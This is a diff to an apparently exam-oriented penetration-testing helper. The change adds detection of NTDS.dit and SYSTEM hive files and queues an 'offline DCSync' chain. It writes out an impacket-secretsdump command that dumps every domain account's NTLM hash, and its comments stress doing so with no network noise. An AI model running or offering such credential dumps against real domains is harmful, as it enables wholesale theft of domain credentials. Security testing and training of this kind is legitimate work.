@@ -146,6 +146,16 @@ def _entities(report, store):
             base = os.path.basename(low)
             if base in ("sam", "system", "security"):
                 e.sam_dirs.setdefault(os.path.dirname(src), set()).add(base)
+            # iter-21: NTDS.dit + SYSTEM offline DCSync chain (R3D).
+            # When the operator has BOTH the NTDS database AND the SYSTEM
+            # hive from the same DC backup, secretsdump can DCSync ALL
+            # domain creds offline with zero network noise.
+            if base in ("ntds.dit", "ntds", "ntds.dit.bak"):
+                e.sam_dirs.setdefault(os.path.dirname(src), set()).add("ntds")
+            if base == "system" and os.path.dirname(src):
+                # system hive shared between SAM (local) and NTDS (domain)
+                # paths - already added above
+                pass
     # merge ingested evidence
     for ev in store.items:
         if ev.kind == "plaintext" and ev.plaintext:
@@ -500,6 +510,15 @@ def run(report, store, ui=None):
                 commands=["impacket-secretsdump -sam SAM -system SYSTEM" +
                           (" -security SECURITY" if "security" in hives else "") + " LOCAL"],
                 src=os.path.join(d, "SAM")))
+        # iter-21: NTDS.dit + SYSTEM = offline DCSync (R3D).
+        # Highest-yield AD chain - dumps EVERY domain account NTLM hash
+        # without touching the network, fully exam-legal.
+        if {"ntds", "system"} <= hives:
+            chains.append(Chain("R3D", "offline DCSync",
+                "NTDS.dit + SYSTEM hive -> offline DCSync (ALL domain creds, no network)",
+                crit=10, conf=0.95, ready=1.5, prox=0.9,      # score 12.83 - tops the queue
+                commands=["impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL"],
+                src=os.path.join(d, "NTDS.dit")))
 
     # ── dedup identical chains across files (keep best score, sum counts) ──
     by_key = {}
